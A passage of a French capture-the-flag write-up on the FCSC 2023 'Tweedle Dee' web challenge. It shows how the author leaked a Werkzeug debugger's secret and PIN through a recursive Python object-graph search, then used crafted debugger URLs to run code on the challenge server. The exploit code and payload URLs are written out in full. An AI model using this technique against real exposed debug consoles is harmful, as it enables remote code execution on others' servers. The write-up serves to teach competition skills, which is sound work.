+</span></span><span class="line"><span class="cl">            <span class="p">):</span>
+</span></span><span class="line"><span class="cl">                <span class="n">response</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">execute_command</span><span class="p">(</span><span class="n">request</span><span class="p">,</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">frame</span><span class="p">)</span>  <span class="c1"># type: ignore</span>
+</span></span></code></pre></div><p>Si tout nos paramètres sont remplit il exécutera la commande passé dans le paramètre <code>cmd</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">execute_command</span><span class="p">(</span>  <span class="c1"># type: ignore[return]</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">request</span><span class="p">:</span> <span class="n">Request</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">command</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">frame</span><span class="p">:</span> <span class="n">DebugFrameSummary</span> <span class="o">|</span> <span class="n">_ConsoleFrame</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Response</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34;Execute a command in a console.&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">contexts</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">frame_contexts</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="nb">id</span><span class="p">(</span><span class="n">frame</span><span class="p">),</span> <span class="p">[])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="n">ExitStack</span><span class="p">()</span> <span class="k">as</span> <span class="n">exit_stack</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">cm</span> <span class="ow">in</span> <span class="n">contexts</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">exit_stack</span><span class="o">.</span><span class="n">enter_context</span><span class="p">(</span><span class="n">cm</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="n">frame</span><span class="o">.</span><span class="n">eval</span><span class="p">(</span><span class="n">command</span><span class="p">),</span> <span class="n">mimetype</span><span class="o">=</span><span class="s2">&#34;text/html&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><p>Cette fonction ne fait qu&rsquo;exécuter notre commande dans la frame passé en paramètre.</p>
+<p>Maintenant que nous savons comment exécuter une commande sans aller dans le chemin <code>/console</code> nous allons pouvoir commencer à faire fuiter les valeurs que nous avons besoin.</p>
+<h2 id="fuite-des-données">Fuite des données</h2>
+<p>En analysant le module de debug on remarque que notre <code>__call__</code> est dans une class appelé <code>DebuggedApplication</code>. A son instance, cette classe va initialiser dans des variables globales de class: le secret, le pin et les frames.</p>
+<p>Pendant des heures j&rsquo;ai cherché à faire fuiter une instance de la classe <code>DebuggedApplication</code>, je n&rsquo;ai malheureusement jamais réussi à trouver manuellement.</p>
+<!-- raw HTML omitted -->
+<p>Pendant le premier challenge Tweedle Dum, j&rsquo;ai utilisé une fonction récursive de recherche de chemin que j&rsquo;ai trouvé sur une writeup CTF time.
+<a href="https://ctftime.org/writeup/10851" target="_blank" rel="noopener noreffer ">https://ctftime.org/writeup/10851</a></p>
+<p>Grâce à cette fonction j&rsquo;ai réussi à trouver l&rsquo;emplacement de mon secret, ce qui m&rsquo;a permit de faire fuiter le reste des données très facilement.</p>
+<p>Voilà comment j&rsquo;ai procédé:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">werkzeug.debug</span> <span class="kn">import</span> <span class="n">DebuggedApplication</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">werkzeug.debug</span> <span class="kn">import</span> <span class="n">DebugTraceback</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># No bruteforce needed, this is just here so you don&#39;t lock yourself or others out by accident</span>
+</span></span><span class="line"><span class="cl"><span class="n">DebuggedApplication</span><span class="o">.</span><span class="n">_fail_pin_auth</span> <span class="o">=</span> <span class="k">lambda</span> <span class="bp">self</span><span class="p">:</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">search</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="n">max_depth</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">visited_clss</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">visited_objs</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">visit</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="n">path</span><span class="o">=</span><span class="s1">&#39;obj&#39;</span><span class="p">,</span> <span class="n">depth</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">yield</span> <span class="n">path</span><span class="p">,</span> <span class="n">obj</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">depth</span> <span class="o">==</span> <span class="n">max_depth</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="p">(</span><span class="nb">int</span><span class="p">,</span> <span class="nb">float</span><span class="p">,</span> <span class="nb">bool</span><span class="p">,</span> <span class="nb">str</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="nb">type</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">obj</span> <span class="ow">in</span> <span class="n">visited_clss</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span>
+</span></span><span class="line"><span class="cl">            <span class="n">visited_clss</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">obj</span> <span class="ow">in</span> <span class="n">visited_objs</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span>
+</span></span><span class="line"><span class="cl">            <span class="n">visited_objs</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1"># attributes</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">name</span> <span class="ow">in</span> <span class="nb">dir</span><span class="p">(</span><span class="n">obj</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">name</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;__&#39;</span><span class="p">)</span> <span class="ow">and</span> <span class="n">name</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s1">&#39;__&#39;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">name</span> <span class="ow">not</span> <span class="ow">in</span>  <span class="p">(</span><span class="s1">&#39;__globals__&#39;</span><span class="p">,</span> <span class="s1">&#39;__class__&#39;</span><span class="p">,</span> <span class="s1">&#39;__self__&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                 <span class="s1">&#39;__weakref__&#39;</span><span class="p">,</span> <span class="s1">&#39;__objclass__&#39;</span><span class="p">,</span> <span class="s1">&#39;__module__&#39;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">            <span class="n">attr</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">yield from</span> <span class="n">visit</span><span class="p">(</span><span class="n">attr</span><span class="p">,</span> <span class="s1">&#39;</span><span class="si">{}</span><span class="s1">.</span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">name</span><span class="p">),</span> <span class="n">depth</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1"># dict values</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="s1">&#39;items&#39;</span><span class="p">)</span> <span class="ow">and</span> <span class="n">callable</span><span class="p">(</span><span class="n">obj</span><span class="o">.</span><span class="n">items</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">obj</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">yield from</span> <span class="n">visit</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="s1">&#39;</span><span class="si">{}</span><span class="s1">[</span><span class="si">{}</span><span class="s1">]&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="nb">repr</span><span class="p">(</span><span class="n">k</span><span class="p">)),</span> <span class="n">depth</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">pass</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1"># items</span>
+</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="p">(</span><span class="nb">set</span><span class="p">,</span> <span class="nb">list</span><span class="p">,</span> <span class="nb">tuple</span><span class="p">,</span> <span class="nb">frozenset</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">obj</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                <span class="k">yield from</span> <span class="n">visit</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="s1">&#39;</span><span class="si">{}</span><span class="s1">[</span><span class="si">{}</span><span class="s1">]&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="nb">repr</span><span class="p">(</span><span class="n">i</span><span class="p">)),</span> <span class="n">depth</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">    <span class="k">yield from</span> <span class="n">visit</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/&lt;secret&gt;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">hello_agent</span><span class="p">(</span><span class="n">secret</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ua</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">user_agent</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">secret</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Secret: &#34;</span><span class="p">,</span> <span class="n">secret</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">path</span><span class="p">,</span> <span class="n">obj</span> <span class="ow">in</span> <span class="n">search</span><span class="p">(</span><span class="n">ua</span><span class="p">,</span> <span class="mi">60</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="nb">str</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span> <span class="o">==</span> <span class="n">secret</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;index.html&#34;</span><span class="p">,</span> <span class="n">msg</span><span class="o">=</span><span class="sa">f</span><span class="s2">&#34;Hello </span><span class="si">{</span><span class="n">ua</span><span class="si">}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ua</span><span class="o">=</span><span class="n">ua</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># TODO: add the vulnerable code here</span>
+</span></span></code></pre></div><p>Etant donné que nous ne pouvions pas avoir le secret, j&rsquo;ai supprimé dans la config nginx l&rsquo;erreur 500 pour faire fuiter mon premier secret et ensuite l&rsquo;envoyer depuis ma route <code>/secret</code>. Lorsque ma fonction <code>hello_agent</code> va détecter le paramètre <code>secret</code> il va effectuer une recherche récursive sur tout l&rsquo;environnement pour trouver le chemin qui contient la string passé en paramètre.</p>
+<p>Path:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">ua</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">to_header</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="n">__loader__</span><span class="p">]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__weakref__</span><span class="o">.</span><span class="vm">__objclass__</span><span class="o">.</span><span class="n">get_data</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="n">__loader__</span><span class="p">]</span><span class="o">.</span><span class="n">create_module</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="n">__builtins__</span><span class="p">][</span><span class="n">__build_class__</span><span class="p">]</span><span class="o">.</span><span class="vm">__self__</span><span class="o">.</span><span class="n">copyright</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">_Printer__setup</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="n">sys</span><span class="p">]</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="n">__main__</span><span class="p">]</span><span class="o">.</span><span class="n">main</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="n">inspect</span><span class="p">]</span><span class="o">.</span><span class="n">BlockFinder</span><span class="o">.</span><span class="n">tokeneater</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="n">importlib</span><span class="p">]</span><span class="o">.</span><span class="n">find_loader</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="n">metadata</span><span class="p">]</span><span class="o">.</span><span class="n">Deprecated</span><span class="o">.</span><span class="n">get</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="n">email</span><span class="p">]</span><span class="o">.</span><span class="n">_policybase</span><span class="o">.</span><span class="n">Compat32</span><span class="o">.</span><span class="vm">__weakref__</span><span class="o">.</span><span class="vm">__objclass__</span><span class="o">.</span><span class="n">clone</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="n">_has_surrogates</span><span class="p">]</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="n">urllib</span><span class="p">]</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">AbstractBasicAuthHandler</span><span class="o">.</span><span class="n">_parse_realm</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="n">http</span><span class="p">]</span><span class="o">.</span><span class="n">cookiejar</span><span class="o">.</span><span class="n">Cookie</span><span class="o">.</span><span class="n">get_nonstandard_attr</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="n">_threading</span><span class="p">]</span><span class="o">.</span><span class="n">Barrier</span><span class="o">.</span><span class="n">_break</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="n">_active</span><span class="p">][</span><span class="mi">140601691986744</span><span class="p">]</span><span class="o">.</span><span class="n">_target</span><span class="o">.</span><span class="vm">__self__</span><span class="o">.</span><span class="n">app</span>
+</span></span></code></pre></div><p>Sachant que app est une instance de <code>DebuggedApplication</code> j&rsquo;ai pu facilement accéder à mes variables de classe.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.discordapp.com/attachments/858439417743540225/1102149221639004200/image.png"
+        data-srcset="https://cdn.discordapp.com/attachments/858439417743540225/1102149221639004200/image.png, https://cdn.discordapp.com/attachments/858439417743540225/1102149221639004200/image.png 1.5x, https://cdn.discordapp.com/attachments/858439417743540225/1102149221639004200/image.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.discordapp.com/attachments/858439417743540225/1102149221639004200/image.png"
+        title="https://cdn.discordapp.com/attachments/858439417743540225/1102149221639004200/image.png" /></p>
+<p>Secret: <code>ezbNJnGGcodQwxNdtmUo</code>
+Pin: <code>892-048-462</code>
+Frame: <code>111144189284128</code></p>
+<p>Nous avons fait fuité toute les informations. Passons à l&rsquo;exploitation.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>Rappelons donc les étapes d&rsquo;exploitation</p>
+<ul>
+<li>Générer un cookie d&rsquo;authentification via le secret et le pin</li>
+<li>Utiliser nos leak pour exécuter la fonctionnalité d&rsquo;exécution de commande.</li>
+</ul>
+<p>Payload:
+<code>https://tweedle-dee.france-cybersecurity-challenge.fr/?&amp;__debugger__=yes&amp;s=ezbNJnGGcodQwxNdtmUo&amp;pin=892-048-462&amp;cmd=pinauth</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.discordapp.com/attachments/858439417743540225/1102150100664463392/image.png"
+        data-srcset="https://cdn.discordapp.com/attachments/858439417743540225/1102150100664463392/image.png, https://cdn.discordapp.com/attachments/858439417743540225/1102150100664463392/image.png 1.5x, https://cdn.discordapp.com/attachments/858439417743540225/1102150100664463392/image.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.discordapp.com/attachments/858439417743540225/1102150100664463392/image.png"
+        title="https://cdn.discordapp.com/attachments/858439417743540225/1102150100664463392/image.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.discordapp.com/attachments/858439417743540225/1102150266414977044/image.png"
+        data-srcset="https://cdn.discordapp.com/attachments/858439417743540225/1102150266414977044/image.png, https://cdn.discordapp.com/attachments/858439417743540225/1102150266414977044/image.png 1.5x, https://cdn.discordapp.com/attachments/858439417743540225/1102150266414977044/image.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.discordapp.com/attachments/858439417743540225/1102150266414977044/image.png"
+        title="https://cdn.discordapp.com/attachments/858439417743540225/1102150266414977044/image.png" /></p>
+<p>Une fois le cookie généré nous allons exécuter une commande.</p>
+<p>Payload:
+<code>https://tweedle-dee.france-cybersecurity-challenge.fr/?__debugger__=yes&amp;frm=111144189284128&amp;&amp;s=ezbNJnGGcodQwxNdtmUo&amp;pin=892-048-462&amp;cmd=7*7</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.discordapp.com/attachments/858439417743540225/1102150892628742204/image.png"
+        data-srcset="https://cdn.discordapp.com/attachments/858439417743540225/1102150892628742204/image.png, https://cdn.discordapp.com/attachments/858439417743540225/1102150892628742204/image.png 1.5x, https://cdn.discordapp.com/attachments/858439417743540225/1102150892628742204/image.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.discordapp.com/attachments/858439417743540225/1102150892628742204/image.png"
+        title="https://cdn.discordapp.com/attachments/858439417743540225/1102150892628742204/image.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.discordapp.com/attachments/858439417743540225/1102151110615109632/image.png"
+        data-srcset="https://cdn.discordapp.com/attachments/858439417743540225/1102151110615109632/image.png, https://cdn.discordapp.com/attachments/858439417743540225/1102151110615109632/image.png 1.5x, https://cdn.discordapp.com/attachments/858439417743540225/1102151110615109632/image.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.discordapp.com/attachments/858439417743540225/1102151110615109632/image.png"
+        title="https://cdn.discordapp.com/attachments/858439417743540225/1102151110615109632/image.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.discordapp.com/attachments/858439417743540225/1102151298335395850/image.png"
+        data-srcset="https://cdn.discordapp.com/attachments/858439417743540225/1102151298335395850/image.png, https://cdn.discordapp.com/attachments/858439417743540225/1102151298335395850/image.png 1.5x, https://cdn.discordapp.com/attachments/858439417743540225/1102151298335395850/image.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.discordapp.com/attachments/858439417743540225/1102151298335395850/image.png"
+        title="https://cdn.discordapp.com/attachments/858439417743540225/1102151298335395850/image.png" /></p>
+<p><strong>Flag:</strong> <code>FCSC{2c149fdce9b3db514fa6adf094121999fea5c38fbb3370350d90925238499cf2}</code></p>
+<h2 id="conclusion">Conclusion</h2>
+<p>J&rsquo;ai beaucoup appris sur le fonctionnement de l&rsquo;environnement python.</p>
+<h2 id="remerciement">Remerciement</h2>
+<p>Je tenais à remercier l&rsquo;auteur du challenge <strong>Bitk</strong> j&rsquo;ai énormément apprécié le challenge et la plupart de ses challenges par ailleurs. J&rsquo;ai trouvé ce CTF très bénéfique pour mon apprentissage alors merci aux organisateurs et aux créateurs des challenges.</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-09-04</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://example.org/posts/fcsc-2023-tweedle-dee-web/" data-title="FCSC 2023 Tweedle Dee Web"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.org/posts/fcsc-2023-tweedle-dee-web/"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://example.org/posts/fcsc-2023-tweedle-dee-web/" data-title="FCSC 2023 Tweedle Dee Web"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://example.org/posts/fcsc-2023-tweedle-dee-web/" data-title="FCSC 2023 Tweedle Dee Web"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://example.org/posts/fcsc-2023-tweedle-dee-web/" data-title="FCSC 2023 Tweedle Dee Web"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/fcsc-2023-peculiar-caterpillar-web/" class="prev" rel="prev" title="FCSC 2023 Peculiar Caterpillar Web"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>FCSC 2023 Peculiar Caterpillar Web</a>
+            <a href="/posts/config-loader-hacksecureims/" class="next" rel="next" title="Config Loader HackSecuReims">Config Loader HackSecuReims<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.118.2">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Lxt3h</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/auto-render.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/copy-tex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
